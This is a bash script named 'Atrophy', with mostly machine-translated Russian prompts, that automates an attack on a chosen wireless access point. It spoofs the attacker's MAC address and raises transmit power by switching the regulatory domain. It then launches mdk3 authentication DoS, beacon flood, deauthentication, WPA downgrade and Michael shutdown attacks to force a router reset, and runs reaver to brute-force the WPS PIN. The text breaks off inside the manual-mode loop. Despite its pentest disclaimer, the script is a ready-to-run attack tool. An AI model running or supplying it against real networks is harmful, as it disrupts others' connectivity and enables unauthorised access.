#!/bin/bash
# This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public
# License as published by the Free Software Foundation; either version 2 of the License, or any later version.
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied
# warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
# You should have received a copy of the GNU General Public License along with this program; if not, write to the
# Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
# --------------------------------------------------------------------------------------------------------------------#

# Disclaimer:   This script is intended for use only for private study or during an authorised pentest. The author bears no responsibility for malicious or illegal use.
#               Skiddies should look elsewhere.


#
# !!!!!!!Благодаря Vulpi автора pwnstar9.0, кто скрипты научил нас так много!!!!!!!
#               Любая помощь с нашей mangeled кодирования рекомендуется.
#                              Musket Teams
##############################################
# ANSI code routines from Vulpi author of
#              PwnStar9.0 
txtrst="\e[0m"      # Text reset 
warn="\e[1;31m"     # warning		   red         
info="\e[1;34m"     # info                 blue             
q="\e[1;32m"		# questions        green
inp="\e[1;36m"	    # input variables  magenta
yel="\e[1;33m"      # типd keyboard entries
##############################################
echo " "
echo -e "$info      ########################################################################################"
echo "      #               Atrophy: A Mdk3-Airodump-ng-Reaver Tool                                #"
echo "      # MDK3 Установка нескольких Вектор DDOS Сброс Беспроводные маршрутизаторы Дистанционно #"
echo "      #              Мушкет команды - Soxrox2212 Сотрудничество                              #"
echo -e "      ########################################################################################$txtrst"

echo -e "$info                                                                        "      
echo -e "$warn  <<<  Все существующие интерфейсы MONITOR (то есть wlan0mon MON1 и т.д.) будут удалены >>>"
echo -e "$q               <<<< ??Вы хотите, продолжить .... ?? >>>>$txtrst"

while true

do
echo -e "$inp       Пожалуйста, подтвердите, нажав $yel(y/Y)$inp чтобы продолжить ...."
echo -e "         Нажмите кнопку  $yel(n/N)$inp чтобы прервать !! .. Нажмите любую клавишу, чтобы попробовать еще раз:$txtrst"

  read CONFIRM
  case $CONFIRM in
    y|Y|YES|yes|Yes) break ;;
    n|N|no|NO|No)
      echo Aborting - you entered $CONFIRM
      exit
      ;;

  esac
done
echo -e "$info  Вы ввели $CONFIRM.  Продолжая...$txtrst"
sleep 3

clear
killall -q reaver &> /dev/null
sleep .2
killall -q airodump-ng &> /dev/null
sleep .2
killall -q aireplay-ng &> /dev/null
sleep .2
killall -q mdk3 &> /dev/null
sleep .2
killall -q Eterm &> /dev/null
airmon-ng stop mon5
clear
airmon-ng stop wlan4mon
clear
airmon-ng stop wlan3mon
clear
airmon-ng stop wlan2mon
clear
airmon-ng stop wlan1mon
clear
airmon-ng stop wlan0mon

####################################
ADVANCEDTEST=ZZZ
until  [ $ADVANCEDTEST == y ] || [ $ADVANCEDTEST == Y ]; do  

clear
echo ""
echo -e "$q  Вы хотите использовать стандартный или расширенный параметр?"
echo -e "$info     Эти расширенные настройки включают в себя.$txtrst"
echo ""
echo "                    1. Установление конкретных МАС-адреса для вашего устройства Wi-Fi."
echo "                    2. Добавить -r x:y команда у к Похититель." #(ADVANCED)" 
echo ""
echo -e "$inp  Enter $yel(s/S)$inp для стандартного или $yel(a/A)$inp для продвинутых.$txtrst" #(ADVANCED)  
read ADVANCED


	while true
	do
	echo ""
echo -e "$inp  Вы ввели $yel$ADVANCED$inp тип $yel(y/Y)$inp чтобы подтвердить или $yel(n/N)$inp чтобы попытаться снова.$txtrst"
read ADVANCEDTEST

	case $ADVANCEDTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done


####################################


DEVTEST=ZZZ
until  [ $DEVTEST == y ] || [ $DEVTEST == Y ]; do  
echo -e "$txtrst "
clear
iwconfig
echo ""
echo -e "$q  Что беспроводное устройство вы будете использовать для выполнения атаки$yel(i.e. wlan0,ath0 etc)$q?"
echo -e "$info    Перечень устройств показано выше.$txtrst" #(DEV)
read DEV

	while true
	do
	echo ""

echo -e "$inp  Вы ввели $yel$DEV$inp тип $yel(y/Y)$inp чтобы подтвердить или $yel(n/N)$inp чтобы попытаться снова.$txtrst"
read DEVTEST

	case $DEVTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Неправильный ввод попробуйте снова !!!$txtrst"

	done

		done


clear
	while true
	do
	echo ""
echo -e "$q  Вы хотите, чтобы повысить свою силу устройства Wi-Fi, чтобы 30dBm?"
echo -e "$info     Эта процедура работает для AWUSO36H и" #(AWUSO)
echo -e "$info       может работать с другими устройствами."
echo -e "$inp         Тип $yel(y/Y)$inp для да или $yel(n/N)$inp для нет.$txtrst"
		read AWUSO
		case $AWUSO in
		y|Y|n|N) break ;;
		~|~~)
		echo Aborting -
		exit
		;;

		esac
		echo -e  "$warn !!!Неправильный ввод попробуйте снова !!!$txtrst"

			done


	if [ $AWUSO == y ] || [ $AWUSO == Y ]; then
		ifconfig $DEV down
		sleep 1
		iw reg set BO
		ifconfig $DEV up
		iwconfig $DEV channel 13
		iwconfig $DEV txpower 30
		iwconfig $DEV rate 1M
        	sleep 2
 
			fi
##############========ADVANCED===============
if [ $ADVANCED == a ] || [ $ADVANCED == A ]; then

echo -e "$q\n  Что MAC-адрес вы хотели бы назначить $DEV?" #(DEVMAC)
echo -e  "$info\n     Введите в этом формате ТОЛЬКО(i.e. 00:11:22:33:44:55)$txtrst"
read DEVMAC
sleep 2
#### MAC Error Handling Begins ###
##################################
# Error Handling For Mac Code Entries
# Tests Length of string
# Tests  Presence of only ::::: punctuation characters
# Tests only hex charcters present

#Sets correct puntuation for test
MACPUNCT=":::::"

sleep .2

# Tests punctuation

PUNCTEST=`echo "$DEVMAC" | tr -d -c ".[:punct:]"`

sleep .2

if [ "$PUNCTEST" == "$MACPUNCT" ]

	then

	    PUNCT=1

	else

	    PUNCT=0

	fi

sleep .2

# Tests hex characters

MACALNUM=`echo "$DEVMAC" | tr -d -c ".[:alnum:]"`

sleep .2


if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

then

	ALNUM=1
else

	ALNUM=0
  fi

sleep .2

# Tests string length

if [ ${#DEVMAC} = 17 ]

then

	MACLEN=1
else

	MACLEN=0
  fi


sleep .2

# All mac variables set to ones(1)  and zeros(0)

until [ $MACLEN == 1 ] && [ $PUNCT == 1 ] && [ $ALNUM == 1 ]; do

	if [ $ALNUM == 0 ]; then
		echo -e "$warn  Вы используете не-шестнадцатеричный символ.$txtrst"

			fi
	
	if [ $MACLEN == 0 ]; then
		echo -e "$warn  Ваш Mac адрес неправильная длина.$txtrst"

			fi

	if [ $PUNCT == 0 ]; then

		echo -e "$warn  Вы ввели неправильный и / или слишком много сепараторы - использовать ТОЛЬКО двоеточия:$txtrst"

			fi

	echo -e "$info  Mac address entry неправильно !!!"
        echo "  Вы должны использовать формат 00: 11: 22: 33: 44: 55 или аа: А. А.: BB: BB: CC: CC"
	echo "  Только через F, A через F, с 0 по 9 и символ: разрешены."
	echo -e "$inp  Повторно MAC-адрес и попробуйте еще раз.$txtrst" #(DEVMAC)
	read DEVMAC

        MACALNUM=`echo "$DEVMAC" | tr -d -c ".[:alnum:]"`
	if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

        then

        	ALNUM=1

        else

	        ALNUM=0

			fi

sleep .2       

	if [ ${#DEVMAC} == 17 ]

	then

		MACLEN=1
	else

		MACLEN=0

			fi

sleep .2

	PUNCTEST=`echo "$DEVMAC" | tr -d -c ".[:punct:]"`
	if [ $PUNCTEST == $MACPUNCT ]

	then

	    PUNCT=1

	else

	    PUNCT=0

			fi

sleep 1

done
		  
#######Mac Error Handling Ends Whew!!#############
##################################################

echo -e "$info  Назначение $yel$DEVMAC$info на устройство Wi-Fi$txtrst"
        sleep 2
sleep 2
	ifconfig $DEV down
	sleep 2
	macchanger -m $DEVMAC $DEV
	sleep 2
	VARMAC=$(ifconfig $DEV | grep "$DEV     Link encap:Ethernet  HWaddr " | sed s/"$DEV     Link encap:Ethernet  HWaddr "//g)
	sleep 2
	ifconfig $DEV hw ether $VARMAC
	sleep 2
	ifconfig $DEV up
        sleep 2
	airmon-ng start $DEV
	sleep 2
        clear
		fi

##############======End MAC Advanced=================

if [ $ADVANCED == s ] || [ $ADVANCED == S ]; then

	echo -e "$info  Назначение случайный MAC-адрес для устройства.$txtrst"
        sleep 2
	ifconfig $DEV down
	sleep 2
	macchanger -r $DEV
	sleep 2
	VARMAC=$(ifconfig $DEV | grep "$DEV     Link encap:Ethernet  HWaddr " | sed s/"$DEV     Link encap:Ethernet  HWaddr "//g)
	sleep 2
	ifconfig $DEV hw ether $VARMAC
	sleep 2
	ifconfig $DEV up
	airmon-ng start $DEV
	sleep 2
        clear
  
		fi
MONTEST=ZZZ
until  [ $MONTEST == y ] || [ $MONTEST == Y ]; do  
echo -e "$txtrst "
clear
iwconfig
echo ""
echo -e "$q  Что беспроводной интерфейс монитора $yel(i.e. wlan0mon, wlan1mon)$q will"
echo -e "     быть использованы mdk3, reaver и Airodump-нг?"
echo -e "$info     Перечень устройств показано выше.$txtrst" #(MON)
read MON

	while true
	do
	echo ""

echo -e "$inp  Вы ввели $yel$MON$inp тип $yel(y/Y)$inp чтобы подтвердить или $yel(n/N)$inp чтобы попытаться снова.$txtrst"
read MONTEST

	case $MONTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Неправильный ввод попробуйте снова !!!$txtrst"

	done

		done

sleep .2
echo -e "$info  Назначение $yel$DEV$info mac address to $yel$MON$info.$txtrst"
ifconfig $MON down
sleep 1
macchanger -m $VARMAC $MON
sleep .1
ifconfig $MON up
sleep 1
clear
echo ""
################-rXY starts############################
RCHOICE=n
if [ $ADVANCED == a ] || [ $ADVANCED == A ]; then

	clear
	while true
	do
	echo ""
echo -e "$q  Вы хотите, чтобы запустить ривера с -r, --recurring-delay=<x:y> задержку = <х: у> Команда"
echo "     т.е. сна для у секунд каждые х контактный покушений"
echo "" 
echo -e "$inp    Тип $yel(y/Y)$inp да, и для $yel(n/N)$inp не для не: (RCHOICE).$txtrst"
	read RCHOICE   
	case $RCHOICE in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn !!!Неправильный ввод попробуйте снова !!!$txtrst"

		done


	if [ $RCHOICE == Y ]; then

		RCHOICE=y 

		fi

	if [ $RCHOICE == N ]; then

		RCHOICE=n

		fi

	if [ $RCHOICE == y ]; then  # if 2

	RXTEST=ZZZ
		until  [ $RXTEST == y ] || [ $RXTEST == Y ]; do  

		echo ""
		echo -e "$q  Сколько контактный потуги x in -r x:y: у до задержки у в секундах (RX "
		echo ""
		echo -e "$inp     Введите число попыток контактный х.$txtrst" #(RX)
		read RX

		while true
		do
		echo ""

		echo -e "$inp  Вы ввели $yel$RX$info тип $yel(y/Y)$inp чтобы подтвердить или $yel(n/N)$inp чтобы попытаться снова.$tstrst"

		read RXTEST
		case $RXTEST in
		y|Y|n|N) break ;;
		~|~~)
		echo Aborting -
		exit
		;;

		esac
		echo -e  "$warn  !!!Неправильный ввод попробуйте снова !!!$txtrst"

		done

			done


		RYTEST=ZZZ
		until  [ $RYTEST == y ] || [ $RYTEST == Y ]; do  

		clear
		echo ""
		echo -e "$q  Сколько секунд будет ривера сон между попытками контактный х, на -г $RX:y?"
		echo ""
		echo -e "$inp     Введите задержку в секундах у. (RY)$txtrst"
		read RY

		while true
		do
		echo ""
		echo -e "$inp  Вы ввели $yel$RY$inp тип $yel(y/Y)$inp чтобы подтвердить или $yel(n/N)$inp чтобы попытаться снова.$txtrst"

		read RYTEST
		case $RYTEST in
		y|Y|n|N) break ;;
		~|~~)
		echo Aborting -
		exit
		;;

		esac
		echo -e  "$warn  !!!Неправильный ввод попробуйте снова !!!$txtrst"

		done

			done

			fi

				fi


#################-rXY ends#################################


echo ""
echo -e "$info  <<<< Вам понадобится следующая информация для настройки атаки DOS. >>>>"
echo ""
echo -e "$txtrst       1. Канал целевой AP."
echo "       2. MAC-адрес целевого AP."
echo ""

####################################

	while true
	do
        echo ""
	echo -e "$info  Вы хотите, чтобы запустить мытье или Airodump-нг, чтобы получить эту информацию?" #(WASHAIR)
	echo -e "$inp     Тип $yel(w/W)$inp для стирки, $yel(a/A)$inp для Airodump-нг или"
	echo -e "       тип $yel(c/C)$inp чтобы пропустить проверку на целевой AP и продолжить ....$txtrst"

		read WASHAIR
		case $WASHAIR in
    		w|W|a|A|c|C) break ;;
    		~|~~)
    		echo Aborting -
    		exit
     		;;

		esac
		echo -e  "$warn !!!Неправильный ввод попробуйте снова !!!$txtrst"

			done


if [ $WASHAIR == w ] || [ $WASHAIR == W ]; then

	until [ $WASHAIR == c ] || [ $WASHAIR == C ]; do
	killall -q Eterm &> /dev/null
        sleep .2
	Eterm -g 80x30-1-210 --cmod "red" -T "WASH" -e sh -c "wash -i $MON; bash" &
	echo -e "$info  Для захвата МАС-адрес из окна Eterm тип $yel "any key" $info и"
        echo "     Окно Eterm будет остановить. Используйте мышь левой кнопкой мыши и перетащить через"
        echo -e "       необходимые данные. Тип $yel(Ctrl-c)$info захватить в буфер обмена. теперь иди"
        echo -e "         в главное меню атрофии и тип $yel(shift-insert)$info вставить MAC-адрес.$txtrst" #(ANYKEY)
	read ANYKEY
	killall -q wash &> /dev/null

		clear
		while true
		do
	echo ""
        echo -e "$info  Если у вас есть МАС-адрес и канал тип $yel(c/C)$inp to"
	echo -e "     продолжать .... or тип $yel(w/W)$inp for wash чтобы попытаться снова.$txtrst"

	read WASHAIR
	case $WASHAIR in
    	c|C|w|W) break ;;
    	~|~~)
    	exit
     	;;

  	esac
	echo -e "$warn !!!Ошибка ввода неправильно попробуйте еще раз !!!$txtrst"

			done

		done

	fi	

if [ $WASHAIR == a ] || [ $WASHAIR == A ]; then
		until [ $WASHAIR == c ] || [ $WASHAIR == C ]; do

	while true
	do
        echo -e "$q  Вы хотите Airodump-нг сканировать все каналы или сканировать фиксированный канал?"
	echo -e "$inp     Тип $yel(1)$inp сканировать все каналы или $yel(2)$inp сканировать определенный канал.$txtrst" #(CHANCHO)

	read CHANCHO
	case $CHANCHO in
	1|2) break ;;
    	~|~~)
    	echo Aborting -
    	exit
     	;;

  	esac
	echo -e  "$warn !!!Неправильный ввод попробуйте снова !!!$txtrst"

		done

			if [ $CHANCHO == 1 ]; then

	killall -q Eterm &> /dev/null
	clear
        sleep .2
	Eterm -g 80x30-1-210 --cmod "red" -T "AIRODUMP-NG" -e sh -c "airodump-ng $MON; bash" &
	echo -e "$info  Для захвата МАС-адрес из окна Eterm тип $yel(any key)$info и"
        echo "     Окно Eterm будет остановить. Используйте мышь левой кнопкой мыши и перетащить через"
        echo -e "       необходимые данные. Тип $yel(Ctrl-c)$info захватить в буфер обмена. теперь иди"
        echo -e "         в главное меню атрофии и тип $yel(shift-insert)$info вставить MAC-адрес.$txtrst" #(ANYKEY)
	read ANYKEY
	killall -q airodump-ng &> /dev/null



	clear
	while true
	do
	echo ""

	echo -e "$info  Если у вас есть МАС-адрес и канал тип $yel(c/C)$inp to"
	echo -e "     continue... or тип $yel(a/A)$inp for airodump-ng чтобы попытаться снова.$txtrst"

	read WASHAIR
	case $WASHAIR in
	c|C|a|A) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn !!!Неправильный ввод попробуйте снова !!!$txtrst"

		done



				fi


			if [ $CHANCHO == 2 ]; then
	killall -q Eterm &> /dev/null
	echo -e "$warn  Если окно Eterm был удален - игнорировать предупреждение выше.$txtrst"
	sleep .2

##########
	clear
	while true
	do
	echo ""
	echo -e "$q  Что канал вашей целевой APS?$txtrst" #(CHANNEL)

	read CHANNEL
	case $CHANNEL in
    	1|2|3|4|5|6|7|8|9|10|11|12|13|14) break ;;
    	~|~~)
    	echo Aborting -
    	exit
     	;;

	esac
	echo -e  "$warn !!!Неправильный ввод попробуйте снова !!!$txtrst"

		done


	Eterm -g 80x30-1-210 --cmod "red" -T "AIRODUMP-NG" -e sh -c "airodump-ng -c $CHANNEL $MON; bash" &
	echo -e "$info  Для захвата МАС-адрес из окна Eterm тип $yel(any key) $info и"
        echo "     Окно Eterm будет остановить. Используйте мышь левой кнопкой мыши и перетащить через"
        echo -e "       необходимые данные. Тип $yel(Ctrl-c)$info захватить в буфер обмена. теперь иди"
        echo -e "         в главное меню атрофии и тип $yel(shift-insert)$info вставить MAC-адрес.$txtrst" #(ANYKEY)
	read ANYKEY
	killall -q airodump-ng &> /dev/null

	clear
	while true
	do
	echo ""
        echo -e "$info  Если у вас есть МАС-адрес и канал тип $yel(c/C)$inp to"
	echo -e "     continue... or тип $yel(a/A)$inp for airodump-ng чтобы попытаться снова.$txtrst"

	read WASHAIR
	case $WASHAIR in
    	c|C|a|A) break ;;
    	~|~~)
    	echo Aborting -
    	exit
     	;;

  	esac
	echo -e  "$warn !!!Неправильный ввод попробуйте снова !!!$txtrst"

					done

				fi
	
		done		
	fi

	
#################################

sleep .2
killall -q wash &> /dev/null
sleep .2
killall -q airodump-ng &> /dev/null
sleep 2
clear
echo ""
echo -e "$q\n  Что MAC-адрес вашей целевой APS?" #(TARGETAP)
echo -e  "$info\n     Введите в этом формате ТОЛЬКО(i.e. 00:11:22:33:44:55)$txtrst"
read TARGETAP
sleep 2
#### MAC Error Handling Begins ###
##################################
# Error Handling For Mac Code Entries
# Tests Length of string
# Tests  Presence of only ::::: punctuation characters
# Tests only hex charcters present

#Sets correct puntuation for test
MACPUNCT=":::::"

sleep .2

# Tests punctuation

PUNCTEST=`echo "$TARGETAP" | tr -d -c ".[:punct:]"`

sleep .2

if [ "$PUNCTEST" == "$MACPUNCT" ]

	then

	    PUNCT=1

	else

	    PUNCT=0

	fi

sleep .2

# Tests hex characters

MACALNUM=`echo "$TARGETAP" | tr -d -c ".[:alnum:]"`

sleep .2


if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

then

	ALNUM=1
else

	ALNUM=0
  fi

sleep .2

# Tests string length

if [ ${#TARGETAP} = 17 ]

then

	MACLEN=1
else

	MACLEN=0
  fi


sleep .2

# All mac variables set to ones(1)  and zeros(0)

until [ $MACLEN == 1 ] && [ $PUNCT == 1 ] && [ $ALNUM == 1 ]; do

	if [ $ALNUM == 0 ]; then
		echo -e "$warn  Вы используете не-шестнадцатеричный символ.$txtrst"

			fi
	
	if [ $MACLEN == 0 ]; then
		echo -e "$warn  Ваш Mac адрес неправильная длина.$txtrst"

			fi

	if [ $PUNCT == 0 ]; then

		echo -e "$warn  Вы ввели неправильный и / или слишком много сепараторы - использовать ТОЛЬКО двоеточия:$txtrst"

			fi

	echo -e "$info  Mac address entry неправильно !!!"
        echo "  Вы должны использовать формат 00: 11: 22: 33: 44: 55 или аа: А. А.: BB: BB: CC: CC"
	echo "  Только через F, A через F, с 0 по 9 и символ: разрешены."
	echo -e "$inp  Повторно MAC-адрес и попробуйте еще раз.$txtrst" #(TARGETAP)
	read TARGETAP

        MACALNUM=`echo "$TARGETAP" | tr -d -c ".[:alnum:]"`
	if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

        then

        	ALNUM=1

        else

	        ALNUM=0

			fi

sleep .2       

	if [ ${#TARGETAP} == 17 ]

	then

		MACLEN=1
	else

		MACLEN=0

			fi

sleep .2

	PUNCTEST=`echo "$TARGETAP" | tr -d -c ".[:punct:]"`
	if [ $PUNCTEST == $MACPUNCT ]

	then

	    PUNCT=1

	else

	    PUNCT=0

			fi

sleep 1

done
  
#######Mac Error Handling Ends Whew!!#############
##################################################

clear
while true
do
echo ""
echo -e "$q  Что канал вашей целевой APS?$txtrst" #(CHANNEL)

	read CHANNEL
	case $CHANNEL in
    	1|2|3|4|5|6|7|8|9|10|11|12|13|14) break ;;
    	~|~~)
    	echo Aborting -
    	exit
     	;;

	esac
	echo -e  "$warn !!!Неправильный ввод попробуйте снова !!!$txtrst"

		done

sleep 2
echo $TARGETAP > blacklist

echo -e "$info  Черный список файл записывается на Deauth / Disass"
echo "      Amoke режим с использованием MAC-адрес показано ниже."
echo -e "$txtrst "
cat blacklist
sleep 2

	clear
	while true
	do
	echo ""
echo -e $q  "Вы хотите, чтобы использовать режим маяка Flood?"
echo -e $inp     "Тип $yel(y/Y)$inp для да или $yel(n/N)$inp для нет.$txtrst" #(BFM)

	read BFM
	case $BFM in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn !!!Неправильный ввод попробуйте снова !!!$txtrst"

		done



	clear
	while true
	do
	echo ""
echo -e $q  "Вы хотите использовать режим WPA понизить?"
		echo -e "$inp     Тип $yel(y/Y)$inp для да или $yel(n/N)$inp для нет.$txtrst" #(WPAD)

	read WPAD
	case $WPAD in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn !!!Неправильный ввод попробуйте снова !!!$txtrst"

		done

	clear
	while true
	do
	echo ""

echo -e "$q  Вы хотите, чтобы включить команду -j в Shutdown эксплуатации Майкл?$txtrst"
echo -e "$info     Если цель точка доступа поддерживает WPA TKIP-, QoS включен и клиент присутствует,"
echo -e "       добавив команду -j позволит сократить время, необходимое для сброса маршрутизатора."
echo ""  
echo -e "$inp Тип $yel(y/Y)$inp добавить команду, тип $yel(n/N)$inp чтобы не добавлять эту команду$txtrst" #(JTKIP)

	read JTKIP
	case $JTKIP in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn !!!Неправильный ввод попробуйте снова !!!$txtrst"

		done





killall -q Eterm &> /dev/null
echo -e "$warn  Если окно Eterm был удален - игнорировать предупреждение выше."


##################Automatic Mode###########################################

	clear
	while true
	do
	echo ""
 
echo ""
echo -e "$warn  НЕ использовать автоматическую режиме, пока не определите,"
echo -e "       Возможность восстанавливать ROUTER в ручном режиме"
echo ""
echo -e "$q  Вы хотите, чтобы использовать автоматический режим или ручной режим?"
echo -e "$info     В автоматическом режиме вы можете установить время для запуска mdk3 deauth."
echo -e "       После выбранное время прошло, mdk3 отключится и ривер"
echo -e "         будет работать до WPS замок видно, то mdk3 будет работать снова."
echo -e "                Используйте CTRL-C на странице программы для выключения"
echo ""
echo -e "$warn  В автоматическом режиме выходной ривер записывается в файл с именем"
echo -e "     /root/reaverlogfile not to the screen."
echo -e "$inp  Тип $yel(a/A)$inp для автоматического режима или $yel(m/M)$inp для ручного режима$txtrst" #(AUTOMAN)

	read AUTOMAN
	case $AUTOMAN in
	a|A|m|M) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn !!!Неправильный ввод попробуйте снова !!!$txtrst"

		done




if [ $AUTOMAN == a ] || [ $AUTOMAN == A ]; then

	until  [ $MDKLIVETEST == y ] || [ $MDKLIVETEST == Y ]; do  
echo -e "$txtrst "
clear
echo ""
echo -e "$q  Как долго минут вы хотите mdk3 запустить?"
echo -e "     выключение и начиная ривера."
echo -e "$info       После выбранное время истекает, mdk3 отключится и reaver"
echo -e "         начнется и продлится до WPS замок видно."
echo -e "$warn    Введите время в нескольких минутах!$txtrst" #(MDKLIVE)
read MDKLIVE

	while true
	do
	echo ""

echo -e "$inp  Вы ввели $yel$MDKLIVE$inp min. тип $yel(y/Y)$inp чтобы подтвердить или $yel(n/N)$inp чтобы попытаться снова.$txtrst"
	
	read MDKLIVETEST
	case $MDKLIVETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Неправильный ввод попробуйте снова !!!$txtrst"

	done

		done
clear	
echo ""
echo -e "$info  Mdk3 будет работать в течение $MDKLIVE минут....$txtrst"
echo "  ==================================="

STARTAUTO=ZZZ #stops unary warning
let LIVE=MDKLIVE*60  #minutes to seconds
FN=1 #starts file outside loop

until [ $STARTAUTO == e ] || [ $STARTAUTO == E ]; do


	Eterm -g 80x10-1-500 --cmod "red" -T "Airodump-ng" -e sh  -c "airodump-ng -c $CHANNEL --bssid $TARGETAP $MON; bash" &

sleep 2

	Eterm -g 80x10+1-210 --cmod "red" -T "Authentication DoS Mode" -e sh  -c "mdk3 $MON a -a $TARGETAP -m; bash" &

sleep 2

	if [ $BFM == y ] || [ $BFM == Y ]; then

	Eterm -g 80x10+1-70 --cmod "red" -T "Beacon Flood Mode" -e sh -c "mdk3 $MON b -a $TARGETAP -h -c $CHANNEL -s 50; bash" &

		fi
sleep 2

	if [ $WPAD == y ] || [ $WPAD == Y ] && [ $BFM == y ] || [ $BFM == Y ]; then

	Eterm -g 80x10-1-350 --cmod "red" -T "WPA Downgrade Mode" -e sh  -c "mdk3 $MON g -t $TARGETAP; bash" &

		fi

sleep 2
	if [ $WPAD == y ] || [ $WPAD == Y ] && [ $BFM == n ] || [ $BFM == N ]; then

	Eterm -g 80x10+1-70 --cmod "red" -T "WPA Downgrade Mode" -e sh  -c "mdk3 $MON g -t $TARGETAP; bash" &

		fi

sleep 2


	Eterm -g 80x10-1-210 --cmod "red" -T "Deauth/Disass Amok Mode" -e sh  -c "mdk3 $MON d -b blacklist -c $CHANNEL -s 250; bash" &

sleep 2

	if [ $JTKIP == y ] || [ $JTKIP == Y ]; then

# Without -j command
	Eterm -g 80x10-1-70 --cmod "red" -T "Michael Shutdown Exploitation w/ -j" -e sh  -c "mdk3 $MON m -t $TARGETAP -j; bash" &

		fi



	if [ $JTKIP == n ] || [ $JTKIP == N ]; then

	Eterm -g 80x10-1-70 --cmod "red" -T "Michael Shutdown Exploitation" -e sh  -c "mdk3 $MON m -t $TARGETAP; bash" &

		fi

#FN=1 #starts file outside loop
PAD=`printf "%05d\n" $FN`





################reaver start#######################
sleep $LIVE

	killall -q mdk3 &> /dev/null
	sleep .2
	killall -q airodump-ng &> /dev/null
	sleep .2
	killall -q Eterm &> /dev/null




	if [ $RCHOICE == n ]; then

		Eterm -g 80x10-1-70 --cmod "red" -T "reaver" -e sh  -c "reaver -i $MON -a -f -c $CHANNEL -b $TARGETAP -vv -x 60 -d 15 -T .5 --out-file=reaverlogfile-$PAD --mac=$VARMAC; bash" &

		fi

	if [ $RCHOICE == y ]; then

		Eterm -g 80x10-1-70 --cmod "red" -T "reaver -r $RX:$RY" -e sh  -c "reaver -i $MON -a -f -c $CHANNEL -b $TARGETAP -vv -x 60 -d 15 -T .5 --out-file=reaverlogfile-$PAD  -r $RX:$RY --mac=$VARMAC; bash" &

		fi


		Eterm -g 80x10+1-70 --cmod "red" -T "Airodump-ng" -e sh  -c "airodump-ng -c $CHANNEL --bssid $TARGETAP $MON; bash" &
		echo ""	


		Eterm -g 80x10-1-300 --cmod "red" -T "Aireplay-ng" -e sh  -c "aireplay-ng -1 120 -a $TARGETAP $MON; bash" &


echo "made it this far"
sleep 10


let FN=FN+1

tail -f reaverlogfile-$PAD | while read LOGLINE 

do

	[[ "${LOGLINE}" == "[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking" ]] && pkill -P $$ tail


	done #tail -f reaverlogfile-$PAD | while read LOGLINE



		done

	killall -q reaver &> /dev/null
	sleep .2
	killall -q airodump-ng &> /dev/null
	sleep .2
	killall -q aireplay-ng &> /dev/null
	sleep .2
	killall -q Eterm &> /dev/null

sleep 5






      fi # loop1 (if [ $AUTOMAN == a ] || [ $AUTOMAN == A ]; than)




#until [ $STARTAUTO == e ] || [ $STARTAUTO == E ]; do




########################MANUAL######################################

   if [ $AUTOMAN == m ] || [ $AUTOMAN == M ]; then

clear
echo ""
echo -e "$inp        !!!!!ЗАПУСК Airodump-NG MDK3 Eterm ОКНА !!!!!$txtrst"
sleep 1



STARTR=ZZZ
until [ $STARTR == e ] || [ $STARTR == E ]; do

	Eterm -g 80x10-1-500 --cmod "red" -T "Airodump-ng" -e sh  -c "airodump-ng -c $CHANNEL --bssid $TARGETAP $MON; bash" &

sleep 2

	Eterm -g 80x10+1-210 --cmod "red" -T "Authentication DoS Mode" -e sh  -c "mdk3 $MON a -a $TARGETAP -m; bash" &

sleep 2

	if [ $BFM == y ] || [ $BFM == Y ]; then

	Eterm -g 80x10+1-70 --cmod "red" -T "Beacon Flood Mode" -e sh -c "mdk3 $MON b -a $TARGETAP -h -c $CHANNEL -s 50; bash" &

		fi
sleep 2

	if [ $WPAD == y ] || [ $WPAD == Y ] && [ $BFM == y ] || [ $BFM == Y ]; then

	Eterm -g 80x10-1-350 --cmod "red" -T "WPA Downgrade Mode" -e sh  -c "mdk3 $MON g -t $TARGETAP; bash" &

		fi

sleep 2
	if [ $WPAD == y ] || [ $WPAD == Y ] && [ $BFM == n ] || [ $BFM == N ]; then

	Eterm -g 80x10+1-70 --cmod "red" -T "WPA Downgrade Mode" -e sh  -c "mdk3 $MON g -t $TARGETAP; bash" &

		fi

sleep 2


	Eterm -g 80x10-1-210 --cmod "red" -T "Deauth/Disass Amok Mode" -e sh  -c "mdk3 $MON d -b blacklist -c $CHANNEL -s 250; bash" &

sleep 2

	if [ $JTKIP == y ] || [ $JTKIP == Y ]; then

# Without -j command
	Eterm -g 80x10-1-70 --cmod "red" -T "Michael Shutdown Exploitation w/ -j" -e sh  -c "mdk3 $MON m -t $TARGETAP -j; bash" &

		fi


	if [ $JTKIP == n ] || [ $JTKIP == N ]; then

	Eterm -g 80x10-1-70 --cmod "red" -T "Michael Shutdown Exploitation" -e sh  -c "mdk3 $MON m -t $TARGETAP; bash" &

		fi


clear
while true
do
echo ""
echo -e "$inp  Enter $yel(r/R)$inp если вы думаете, маршрутизатор перезагрузится и хотите, чтобы начать Reaver."
echo -e "$inp     Enter $yel(e/E)$inp чтобы пропустить ривера еще пытаясь сбросить маршрутизатор"
